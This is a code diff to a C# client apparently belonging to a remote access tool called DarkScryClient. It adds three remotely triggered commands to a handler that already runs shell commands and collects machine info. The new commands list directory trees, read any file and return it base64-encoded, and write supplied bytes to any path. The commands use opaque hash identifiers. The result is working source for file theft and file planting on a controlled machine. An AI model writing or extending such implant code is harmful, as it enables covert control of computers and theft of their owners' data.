@@ -1,13 +1,10 @@
 ﻿using DarkScryClient.Moduls.Collection;
+using DarkScryClient.Moduls.Collection.Files;
 using DarkScryClient.Utils;
 using System;
 using System.Collections.Generic;
-using System.Data.SqlClient;
-using System.Linq;
-using System.Net.Http.Headers;
-using System.Text;
+using System.IO;
 using System.Text.Json;
-using System.Threading.Tasks;
 using System.Xml;
 
 namespace DarkScryClient.Client
@@ -19,7 +16,9 @@ namespace DarkScryClient.Client
 			public const string START_SHELL_INSTANCE   = "be425fd08e9ea24230bac47493228ada";
 			public const string RUN_COMMAND            = "58e129c7158b9fed8be5473640e54ae4";
 			public const string GET_BASIC_MACHINE_INFO = "929cecb8e795d93306020c7f2e8682d2";
-
+			public const string SNAP_FULL_DIRECTORY    = "74d6aa572d1b19102f9f5aedbe00dfd0";
+			public const string GET_FILE_BASE_64       = "d69c0ca9f6848c89b7e9223b2d186a15";
+			public const string UPLOAD_FILE_BASE_64    = "81324d42b1bbe52342d521ee64b7a30f";
 		}
 
 		private XmlDocument xmlDoc;
@@ -55,6 +54,28 @@ namespace DarkScryClient.Client
 				case CommandIdentifiers.GET_BASIC_MACHINE_INFO:
 					var bmi = MachineInfo.BasicMachineInfoRetriever.GetBasicMachineInfo();
 					return Tools.StringToBytes(JsonSerializer.Serialize(bmi));
+
+				case CommandIdentifiers.SNAP_FULL_DIRECTORY:
+					string root_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
+					if (string.IsNullOrEmpty(root_path))
+					{
+						root_path = Environment.CurrentDirectory;
+					}
+					string files_and_dirs = FilesExplorer.GetFilesAndDirectories(root_path);
+					return Tools.StringToBytes(JsonSerializer.Serialize(files_and_dirs));
+
+				case CommandIdentifiers.GET_FILE_BASE_64:
+					string file_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
+					var responseObj = new GetFileBase64Response { file_base64 = Convert.ToBase64String(File.ReadAllBytes(file_path)) };
+					return Tools.StringToBytes(JsonSerializer.Serialize(responseObj));
+
+				case CommandIdentifiers.UPLOAD_FILE_BASE_64:
+					string uploaded_path = xmlDoc.SelectSingleNode("/root/path").InnerText;
+					string uploaded_base64 = xmlDoc.SelectSingleNode("/root/file_base64").InnerText;
+					string uploaded_file_name = xmlDoc.SelectSingleNode("/root/file_name").InnerText;
+					File.WriteAllBytes(Path.Combine(uploaded_path, uploaded_file_name), Convert.FromBase64String(uploaded_base64));
+					return Tools.StringToBytes(JsonSerializer.Serialize(new Dictionary<string, object> { { "status", true } }));
+
 				default:
 					return PackCommand("Unknow Action", action, 1);
 			}
